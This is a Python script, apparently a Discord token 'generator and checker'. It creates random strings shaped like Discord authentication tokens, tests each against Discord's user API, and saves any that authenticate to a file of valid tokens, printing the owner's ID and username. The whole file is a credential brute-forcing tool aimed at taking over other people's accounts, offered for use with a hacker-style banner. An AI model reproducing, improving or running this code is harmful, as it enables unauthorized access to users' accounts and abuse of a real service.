#Imports
import random
import string
import requests
from colorama import Fore, Back, Style, init

def generate_segment(length):
    """Generates a random string of specified length, including letters, digits, underscores, and hyphens."""
    characters = string.ascii_letters + string.digits + '_-'
    return ''.join(random.choices(characters, k=length))

def generate_token():
    """Generates a token similar to the provided example."""
    segment1 = generate_segment(24)  # First segment
    segment2 = generate_segment(6)    # Second segment
    segment3 = generate_segment(24)   # Third segment
    
    token = f"{segment1}.{segment2}.{segment3}"
    return token

def generate_tokens(amount):
    """Generates the specified amount of tokens."""
    tokens = [generate_token() for _ in range(amount)]
    return tokens

def save_tokens_to_file(tokens, filename='tokens.txt'):
    """Saves the generated tokens to a specified file."""
    with open(filename, 'w') as f:
        for token in tokens:
            f.write(f"{token}\n")

def check_discord_token(token, valid_tokens_file):
    url = "https://discord.com/api/v10/users/@me"
    headers = {
        "Authorization": token
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        print("Valid token.")
        user_data = response.json()
        print(f"User ID: {user_data['id']}")
        print(f"Username: {user_data['username']}#{user_data['discriminator']}")
        
        # Save the valid token to the specified file
        with open(valid_tokens_file, 'a') as valid_file:
            valid_file.write(token + '\n')
            
    elif response.status_code == 401:
        print("Invalid token.")
    else:
        print(f"Failed to check token. Status code: {response.status_code}, Response: {response.text}")

def check_tokens_from_file(filepath, valid_tokens_file):
    try:
        with open(filepath, 'r') as file:
            tokens = file.readlines()
        
        for token in tokens:
            token = token.strip()  # Remove any leading/trailing whitespace
            if token:  # Check if the line is not empty
                print(f"Checking token: {token}")
                check_discord_token(token, valid_tokens_file)
    except FileNotFoundError:
        print(f"File not found: {filepath}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

init()

ASCII_LOGO = Fore.RED + r"""
     _                                                      ___        
    | |__   ___ _ __  _ __ _   _ _ __ ___   __ _ _ __  ___ / _ \ _ __  
    | '_ \ / _ \ '_ \| '__| | | | '_ ` _ \ / _` | '_ \/ __| | | | '_ \ 
    | | | |  __/ | | | |  | |_| | | | | | | (_| | | | \__ \ |_| | | | |
    |_| |_|\___|_| |_|_|   \__, |_| |_| |_|\__,_|_| |_|___/\___/|_| |_| 
                       |___/                                                                    
 """ + Style.RESET_ALL
# Logo by serify.
print(ASCII_LOGO)

init()

if __name__ == "__main__":
    # Token generation section
    try:
        num_tokens = int(input(Fore.RED + "Enter the number of tokens to generate: "+ Fore.RESET))
        if num_tokens <= 0:
            raise ValueError(Fore.RED +"The number of tokens must be a positive integer."+ Fore.RESET)
        
        tokens = generate_tokens(num_tokens)
        save_tokens_to_file(tokens)
        print(f"Generated {num_tokens} tokens and saved to tokens.txt")
    
    except ValueError as e:
        print(Fore.RED + f"Invalid input: {e}"+ Fore.RESET)

    # Token validation section
    filepath = "tokens.txt"  # Path to the input tokens file
    valid_tokens_file = "valid_tokens.txt"  # Path to the output file for valid tokens
    check_tokens_from_file(filepath, valid_tokens_file)
